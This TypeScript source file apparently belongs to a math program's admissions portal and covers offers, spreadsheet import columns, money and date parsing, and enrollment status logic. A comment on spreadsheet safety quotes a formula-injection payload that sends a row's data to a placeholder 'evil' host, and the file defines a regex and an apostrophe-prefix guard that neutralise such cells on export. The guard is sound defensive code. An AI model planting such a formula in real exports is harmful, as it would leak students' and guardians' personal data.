import { z } from 'zod';
import { ApplicationStatus } from './application.js';

/*
 * Offers, the admin spreadsheet import, and enrollment.
 *
 * This file is the single source of truth for the import columns. The template
 * generator, the sheet parser, the validator, and the preview UI all read
 * OFFER_IMPORT_COLUMNS — add a column here and all four follow.
 *
 * The coercers live here rather than in the backend because the preview UI
 * formats money with the same code that parsed it.
 */

/** Program-local time. Enrollment deadlines are calendar days in this zone. */
export const PROGRAM_TIMEZONE = 'America/New_York';

/** Working tuition figure for the pilot; see planning/Ross Projective Overview-2.txt. */
export const TUITION_CENTS = 150_000;

/*
 * `roleName` and `abbrev` exist for Discord: a section role reads
 * 'Quadratic-Forms-2' and its group roles read 'QF-2-Group-3'. Both are
 * derived, never typed by hand, so a role name can never drift from the
 * course it belongs to. See sectionRoleName()/groupRoleName() in discord.ts.
 */
export const COURSES = [
  { key: 'topology', label: 'Point-Set Topology', roleName: 'Point-Set-Topology', abbrev: 'PST' },
  { key: 'ggt', label: 'Geometric Group Theory', roleName: 'Geometric-Group-Theory', abbrev: 'GGT' },
  { key: 'cgt', label: 'Combinatorial Game Theory', roleName: 'Combinatorial-Game-Theory', abbrev: 'CGT' },
  { key: 'quadratic', label: 'Quadratic Forms', roleName: 'Quadratic-Forms', abbrev: 'QF' },
] as const;

export type CourseKey = (typeof COURSES)[number]['key'];

export function courseLabel(key: string | null | undefined): string | null {
  return COURSES.find((c) => c.key === key)?.label ?? null;
}

/**
 * Resolve a spreadsheet cell to a course key. Accepts the key or the label,
 * case- and whitespace-insensitively, because admins will paste either.
 */
export function resolveCourseKey(raw: string): CourseKey | null {
  const s = raw.trim().toLowerCase();
  if (s === '') return null;
  const hit = COURSES.find(
    (c) => c.key === s || c.label.toLowerCase() === s,
  );
  return hit?.key ?? null;
}

/* -------- money -------- */

export type MoneyParse =
  | { ok: true; cents: number }
  | { ok: false; code: 'not_money' | 'negative' | 'too_precise' | 'too_large' };

/** $10,000 — anything larger is a typo, not a tuition bill. */
const MAX_CENTS = 1_000_000;

const MONEY_RE = /^\$?\s*(\d{1,3}(?:,\d{3})*|\d+)(?:\.(\d{1,2}))?$/;

/**
 * Parse a spreadsheet cell into integer cents with no floating-point error.
 *
 * The trick for XLSX numeric cells: String(n) yields the shortest decimal that
 * round-trips the double, which recovers the literal the admin typed
 * ("1234.56") rather than 1234.5599999999999. After that we never touch
 * floating point again — cents are assembled by string surgery, and
 * Number(dollars) * 100 is exact for any integer below 2^53/100.
 */
export function parseMoneyToCents(raw: unknown): MoneyParse {
  if (raw === null || raw === undefined) return { ok: true, cents: 0 };
  if (typeof raw === 'boolean') return { ok: false, code: 'not_money' };

  const s = (typeof raw === 'number' ? String(raw) : String(raw)).trim();
  if (s === '') return { ok: true, cents: 0 };

  // Accounting-style negatives, e.g. "(500)".
  if (s.startsWith('-') || s.startsWith('(')) return { ok: false, code: 'negative' };
  // Scientific notation only — a bare /e/ test would also match "twelve".
  if (/^\$?\s*\d+(?:\.\d+)?e[+-]?\d+$/i.test(s)) {
    return { ok: false, code: 'too_large' };
  }

  const m = MONEY_RE.exec(s);
  if (!m) {
    // Distinguish "1500.005" from "twelve dollars" for a usable error message.
    return {
      ok: false,
      code: /^\$?\s*[\d,]+\.\d{3,}$/.test(s) ? 'too_precise' : 'not_money',
    };
  }

  const dollars = m[1]!.replace(/,/g, '');
  const cents = (m[2] ?? '').padEnd(2, '0');
  const total = Number(dollars) * 100 + Number(cents);

  if (!Number.isSafeInteger(total)) return { ok: false, code: 'too_large' };
  if (total > MAX_CENTS) return { ok: false, code: 'too_large' };
  return { ok: true, cents: total };
}

/** Render integer cents as "$1,500" or "$1,500.50". Whole dollars drop the .00. */
export function formatCents(cents: number): string {
  const neg = cents < 0;
  const abs = Math.abs(cents);
  const dollars = Math.floor(abs / 100);
  const rem = abs % 100;
  const grouped = dollars.toLocaleString('en-US');
  const body = rem === 0 ? grouped : `${grouped}.${String(rem).padStart(2, '0')}`;
  return `${neg ? '-' : ''}$${body}`;
}

/* -------- dates -------- */

export type DateParse =
  | { ok: true; date: string | null }
  | { ok: false; code: 'unparseable' | 'two_digit_year' };

const ISO_RE = /^(\d{4})-(\d{2})-(\d{2})$/;
const US_RE = /^(\d{1,2})\/(\d{1,2})\/(\d{2}|\d{4})$/;

function ymd(y: number, m: number, d: number): string | null {
  if (m < 1 || m > 12 || d < 1 || d > 31) return null;
  // Reject Feb 30 and friends by round-tripping through UTC.
  const dt = new Date(Date.UTC(y, m - 1, d));
  if (dt.getUTCFullYear() !== y || dt.getUTCMonth() !== m - 1 || dt.getUTCDate() !== d) {
    return null;
  }
  return `${String(y).padStart(4, '0')}-${String(m).padStart(2, '0')}-${String(d).padStart(2, '0')}`;
}

/**
 * Parse a deadline cell to 'YYYY-MM-DD'.
 *
 * Handles the four shapes that actually arrive: a real Date (xlsx cellDates,
 * built at UTC midnight — so read UTC parts, never local), an ISO string, the
 * M/D/YYYY that Excel writes the moment someone opens and re-saves a CSV, and
 * a bare Excel serial number. Two-digit years are rejected rather than guessed.
 */
export function parseDeadline(raw: unknown): DateParse {
  if (raw === null || raw === undefined) return { ok: true, date: null };

  if (raw instanceof Date) {
    if (Number.isNaN(raw.getTime())) return { ok: false, code: 'unparseable' };
    const s = ymd(raw.getUTCFullYear(), raw.getUTCMonth() + 1, raw.getUTCDate());
    return s ? { ok: true, date: s } : { ok: false, code: 'unparseable' };
  }

  if (typeof raw === 'number') {
    const s = excelSerialToYmd(raw);
    return s ? { ok: true, date: s } : { ok: false, code: 'unparseable' };
  }

  const str = String(raw).trim();
  if (str === '') return { ok: true, date: null };

  const iso = ISO_RE.exec(str);
  if (iso) {
    const s = ymd(Number(iso[1]), Number(iso[2]), Number(iso[3]));
    return s ? { ok: true, date: s } : { ok: false, code: 'unparseable' };
  }

  const us = US_RE.exec(str);
  if (us) {
    if (us[3]!.length === 2) return { ok: false, code: 'two_digit_year' };
    const s = ymd(Number(us[3]), Number(us[1]), Number(us[2]));
    return s ? { ok: true, date: s } : { ok: false, code: 'unparseable' };
  }

  // A serial that survived as text, e.g. from a CSV round-trip.
  if (/^\d+(\.\d+)?$/.test(str)) {
    const s = excelSerialToYmd(Number(str));
    return s ? { ok: true, date: s } : { ok: false, code: 'unparseable' };
  }

  return { ok: false, code: 'unparseable' };
}

/** Excel's day 1 is 1900-01-01, with its famous phantom 1900-02-29; epoch 1899-12-30. */
function excelSerialToYmd(n: number): string | null {
  if (!Number.isFinite(n) || n < 1 || n > 60_000) return null;
  const ms = Math.round(n) * 86_400_000 + Date.UTC(1899, 11, 30);
  const dt = new Date(ms);
  return ymd(dt.getUTCFullYear(), dt.getUTCMonth() + 1, dt.getUTCDate());
}

/** Today as 'YYYY-MM-DD' in program-local time. en-CA formats as ISO. */
export function todayInProgramTz(now: Date = new Date()): string {
  return now.toLocaleDateString('en-CA', { timeZone: PROGRAM_TIMEZONE });
}

/** A deadline of null never expires. Comparison is lexicographic on ISO dates. */
export function isPastDeadline(deadline: string | null, now?: Date): boolean {
  if (!deadline) return false;
  return todayInProgramTz(now) > deadline;
}

/* -------- spreadsheet safety -------- */

/*
 * Excel and LibreOffice evaluate any cell whose text begins with = + - @ (or a
 * leading tab/newline) as a formula. That cuts two ways here:
 *
 *  1. SECURITY. `student_name` is typed by the applicant. A name of
 *     `=HYPERLINK("http://evil/"&A1,"click")` becomes a live formula in the
 *     admin's spreadsheet — WEBSERVICE() and friends can exfiltrate the row.
 *  2. CORRECTNESS. nanoid's alphabet includes `-`, so ~1.8% of app_ids start
 *     with one. Excel renders those as #NAME? and, on re-save, the id is gone
 *     and the row fails to import.
 *
 * The fix for both is the classic one: prefix with an apostrophe, which Excel
 * reads as "this is text" and strips on display.
 */
const FORMULA_LEAD = /^[=+\-@\t\r\n]/;

/** Neutralize a cell for export. */
export function csvGuard(value: string): string {
  return FORMULA_LEAD.test(value) ? `'${value}` : value;
}

/**
 * Undo csvGuard on import.
 *
 * Only strips the apostrophe when a dangerous character follows, so a note
 * that genuinely begins with one ("'tis the season") survives untouched. Excel
 * itself drops the apostrophe on re-save, so this matters for the case where
 * a template is downloaded and re-uploaded without being opened.
 */
export function stripCsvGuard(value: string): string {
  return value.startsWith("'") && FORMULA_LEAD.test(value.slice(1))
    ? value.slice(1)
    : value;
}

/* -------- import columns -------- */

/**
 * Fields the importer may write. `internalNotes` lands on
 * application.decision_notes; everything else lands on the offer row.
 */
export const OFFER_FIELDS = [
  'status',
  'courseKey',
  'section',
  'cohort',
  'problemSession',
  'officeHours',
  'aidAmountCents',
  'amountDueCents',
  'enrollmentDeadline',
  'notes',
  'internalNotes',
] as const;
export type OfferField = (typeof OFFER_FIELDS)[number];

export type OfferImportColumn = {
  /** Exact header text in the sheet. STABLE — renaming breaks saved templates. */
  key: string;
  label: string;
  /**
   * key      — row identity, never written
   * readonly — echoed for humans; verified or ignored, never written
   * editable — written back to the DB
   */
  kind: 'key' | 'readonly' | 'editable';
  field: OfferField | null;
  type: 'string' | 'text' | 'money' | 'date' | 'enum';
  enumValues?: readonly string[];
  /** Shown in the template's help row and the preview legend. */
  help: string;
  maxLength?: number;
  /**
   * Optional format constraint for a `string` column. Used where a value is
   * not merely displayed but PARSED downstream — section and group names
   * become Discord role names, so 'topology 2 (Tues)' in a spreadsheet cell
   * would otherwise mint a garbage role for 24 students.
   */
  pattern?: { re: RegExp; message: string };
};

/**
 * Statuses an admin may set by import. The family-owned three
 * (accepted-by-family, paid, declined) are deliberately absent — see
 * validateImport rule 5.
 */
export const ADMIN_SETTABLE_STATUSES = [
  'under_review',
  'accepted',
  'waitlisted',
  'rejected',
  'withdrawn',
] as const;

/** Statuses only the family or the Stripe webhook may produce. */
export const FAMILY_OWNED_STATUSES = [
  'awaiting_payment',
  'enrolled',
  'declined',
] as const;

/**
 * The statuses that are a pure function of (offer.response, payments). Any
 * other status — waitlisted, rejected, withdrawn — is a human decision, and
 * derivation must never overwrite one.
 */
export const DERIVED_STATUSES = [
  'accepted',
  'awaiting_payment',
  'enrolled',
  'declined',
] as const;

export type DerivableOffer = {
  response: 'accepted' | 'declined' | null;
  amountDueCents: number;
};

/**
 * The single place these four statuses are computed. Lives here, with no
 * database in reach, so the offer service and the pure import validator agree
 * by construction rather than by two copies of the same four lines.
 *
 * paidCents is the SUM of paid payments, not one payment's amount — that is
 * what makes installments and mid-flight price changes correct for free.
 */
export function deriveStatus(o: DerivableOffer, paidCents: number): ApplicationStatus {
  if (o.response === 'declined') return 'declined';
  if (o.response !== 'accepted') return 'accepted';
  return paidCents >= o.amountDueCents ? 'enrolled' : 'awaiting_payment';
}

export const OFFER_IMPORT_COLUMNS: readonly OfferImportColumn[] = [
  {
    key: 'app_id',
    label: 'App ID',
    kind: 'key',
    field: null,
    type: 'string',
    help: 'Do not edit. Identifies the row.',
  },

  /*
   * Read-only context. None of it is written back — it is here because
   * placing a student into a section needs their timezone, grade, and proof
   * experience in front of you while you type.
   */
  {
    key: 'student_email',
    label: 'Student email',
    kind: 'readonly',
    field: null,
    type: 'string',
    help: 'Do not edit. Verified against our records; a mismatch blocks the import.',
  },
  {
    key: 'preferred_name',
    label: 'Preferred name',
    kind: 'readonly',
    field: null,
    type: 'string',
    help: 'Do not edit. Ignored on import.',
  },
  {
    key: 'legal_name',
    label: 'Legal name',
    kind: 'readonly',
    field: null,
    type: 'string',
    help: 'Do not edit. Ignored on import.',
  },
  {
    key: 'grade',
    label: 'Grade',
    kind: 'readonly',
    field: null,
    type: 'string',
    help: 'Do not edit. Ignored on import.',
  },
  {
    key: 'proof_experience',
    label: 'Proof experience',
    kind: 'readonly',
    field: null,
    type: 'string',
    help: 'Do not edit. The applicant\u2019s own answer, for placement.',
  },
  {
    key: 'school',
    label: 'School',
    kind: 'readonly',
    field: null,
    type: 'string',
    help: 'Do not edit. Ignored on import.',
  },
  {
    key: 'location',
    label: 'Location',
    kind: 'readonly',
    field: null,
    type: 'string',
    help: 'Do not edit. Ignored on import.',
  },
  {
    key: 'timezone',
    label: 'Time zone',
    kind: 'readonly',
    field: null,
    type: 'string',
    help: 'Do not edit. The times you enter below are in THIS zone.',
  },
  {
    key: 'aid_request',
    label: 'Aid requested',
    kind: 'readonly',
    field: null,
    type: 'string',
    help: 'Do not edit. What the family asked for, not what you awarded.',
  },
  {
    key: 'guardian_name',
    label: 'Guardian name',
    kind: 'readonly',
    field: null,
    type: 'string',
    help: 'Do not edit. Ignored on import.',
  },
  {
    key: 'guardian_email',
    label: 'Guardian email',
    kind: 'readonly',
    field: null,
    type: 'string',
    help: 'Do not edit. Also notified when you publish.',
  },

  /* Everything below is written back. */
  {
    key: 'status',
    label: 'Status',
    kind: 'editable',
    field: 'status',
    type: 'enum',
    enumValues: ADMIN_SETTABLE_STATUSES,
    help: 'under_review | accepted | waitlisted | rejected | withdrawn. Leave as-is for no change.',
  },
  {
    key: 'course',
    label: 'Course',
    kind: 'editable',
    field: 'courseKey',
    type: 'enum',
    enumValues: COURSES.map((c) => c.key),
    help: 'topology | ggt | cgt | quadratic. Full course names also accepted.',
  },
  {
    key: 'section',
    label: 'Section',
    kind: 'editable',
    field: 'section',
    type: 'string',
    maxLength: 40,
    pattern: {
      re: /^[A-Z]+-[0-9]+$/,
      message: 'Use the form COURSE-N, e.g. "TOPOLOGY-2" — it becomes a Discord role name.',
    },
    help: 'e.g. "TOPOLOGY-2". Shown to the family, and becomes a Discord role.',
  },
  {
    key: 'group',
    label: 'Group',
    kind: 'editable',
    field: 'cohort',
    type: 'string',
    maxLength: 40,
    pattern: {
      re: /^[0-9]+$/,
      message: 'Use a number, e.g. "5" — it becomes a Discord role name.',
    },
    help: 'Breakout group within the section, e.g. "5". Shown to the family, and becomes a Discord role.',
  },
  {
    key: 'problem_session',
    label: 'Problem session',
    kind: 'editable',
    field: 'problemSession',
    type: 'string',
    maxLength: 120,
    help: 'Weekly 90-min session, in the STUDENT\u2019s local time, e.g. "Sun 09:00".',
  },
  {
    key: 'office_hours',
    label: 'Office hours',
    kind: 'editable',
    field: 'officeHours',
    type: 'string',
    maxLength: 120,
    help: 'Weekly 90-min office hour, in the STUDENT\u2019s local time, e.g. "Sat 09:00".',
  },
  {
    key: 'aid_amount',
    label: 'Aid awarded',
    kind: 'editable',
    field: 'aidAmountCents',
    type: 'money',
    help: 'Dollars AWARDED. "$1,200" or "1200.00". Blank means $0.',
  },
  {
    key: 'amount_due',
    label: 'Amount due',
    kind: 'editable',
    field: 'amountDueCents',
    type: 'money',
    help: 'Dollars the family pays. Enter 0 explicitly for a full scholarship.',
  },
  {
    key: 'enrollment_deadline',
    label: 'Enrollment deadline',
    kind: 'editable',
    field: 'enrollmentDeadline',
    type: 'date',
    help: 'YYYY-MM-DD. End of that day, Eastern time.',
  },
  {
    key: 'notes',
    label: 'Notes to family',
    kind: 'editable',
    field: 'notes',
    type: 'text',
    maxLength: 2000,
    help: 'VISIBLE TO THE STUDENT AND PARENT. Do not put review notes here.',
  },
  {
    key: 'internal_notes',
    label: 'Internal notes',
    kind: 'editable',
    field: 'internalNotes',
    type: 'text',
    maxLength: 2000,
    help: 'Admin only. Never shown to families.',
  },
];

export const IMPORT_COLUMN_BY_KEY: ReadonlyMap<string, OfferImportColumn> =
  new Map(OFFER_IMPORT_COLUMNS.map((c) => [c.key, c]));

/** Hard caps applied before parsing, so a huge upload cannot exhaust memory. */
export const IMPORT_MAX_BYTES = 2 * 1024 * 1024;
export const IMPORT_MAX_ROWS = 5000;

/* -------- wire types -------- */

export const OfferView = z.object({
  courseKey: z.string().nullable(),
  courseLabel: z.string().nullable(),
  section: z.string().nullable(),
  cohort: z.string().nullable(),
  problemSession: z.string().nullable(),
  officeHours: z.string().nullable(),
  tuitionCents: z.number().int(),
  aidAmountCents: z.number().int(),
  amountDueCents: z.number().int(),
  enrollmentDeadline: z.string().nullable(),
  notes: z.string().nullable(),
  response: z.enum(['accepted', 'declined']).nullable(),
  respondedAt: z.number().nullable(),
  respondedByKind: z.enum(['student', 'guardian']).nullable(),
  paidCents: z.number().int(),
  pastDeadline: z.boolean(),
  paymentsEnabled: z.boolean(),
});
export type OfferView = z.infer<typeof OfferView>;

export const OfferEnvelope = z.object({
  applicationId: z.string(),
  status: ApplicationStatus,
  actorKind: z.enum(['student', 'guardian']),
  studentName: z.string().nullable(),
  offer: OfferView.nullable(),
});
export type OfferEnvelope = z.infer<typeof OfferEnvelope>;

export const ImportIssue = z.object({
  /** 1-based row number as the admin sees it in the spreadsheet (header is 1). */
  row: z.number().int(),
  column: z.string().nullable(),
  code: z.string(),
  message: z.string(),
});
export type ImportIssue = z.infer<typeof ImportIssue>;

export const ImportChange = z.object({
  field: z.enum(OFFER_FIELDS),
  column: z.string(),
  before: z.unknown(),
  after: z.unknown(),
});
export type ImportChange = z.infer<typeof ImportChange>;

export const ImportRow = z.object({
  row: z.number().int(),
  appId: z.string(),
  studentName: z.string().nullable(),
  studentEmail: z.string().nullable(),
  currentStatus: ApplicationStatus.nullable(),
  changes: z.array(ImportChange),
  errors: z.array(ImportIssue),
  warnings: z.array(ImportIssue),
});
export type ImportRow = z.infer<typeof ImportRow>;

export const ImportPreview = z.object({
  fileHash: z.string(),
  filename: z.string(),
  rowCount: z.number().int(),
  /** Editable columns present in the sheet — these are the fields we may write. */
  appliedColumns: z.array(z.string()),
  /** Editable columns absent from the sheet — untouched on every row. */
  absentColumns: z.array(z.string()),
  unknownColumns: z.array(z.string()),
  changedRows: z.array(ImportRow),
  errorRows: z.array(ImportRow),
  warningRows: z.array(ImportRow),
  unchangedCount: z.number().int(),
  errorCount: z.number().int(),
  fatal: z.array(ImportIssue),
});
export type ImportPreview = z.infer<typeof ImportPreview>;

export const PublishResult = z.object({
  importId: z.string(),
  applied: z.number().int(),
  changedAppIds: z.array(z.string()),
  alreadyPublished: z.boolean(),
});
export type PublishResult = z.infer<typeof PublishResult>;

export const NotifyResult = z.object({
  sent: z.number().int(),
  skipped: z.number().int(),
  recipients: z.array(z.string()),
});
export type NotifyResult = z.infer<typeof NotifyResult>;
